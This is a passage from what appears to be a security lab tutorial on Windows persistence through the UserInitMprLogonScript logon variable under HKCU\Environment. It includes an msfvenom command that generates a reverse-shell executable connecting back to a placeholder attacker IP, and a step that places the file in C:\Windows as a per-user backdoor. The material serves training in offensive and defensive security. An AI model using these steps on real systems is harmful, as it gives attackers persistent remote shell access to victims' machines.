One of the things `userinit.exe` does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.

Note:
	Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT={4453} -f exe -o {revshell.exe}
```

```shell-session
C:\> move revshell.exe C:\Windows
```

To create an environment variable for a user, you can go to its `HKCU\Environment` in the registry. We will use the `UserInitMprLogonScript` entry to point to our payload so it gets loaded when the users logs in:

Note:
	Notice that this registry key has no equivalent in `HKLM`, making your backdoor apply to the current user only.
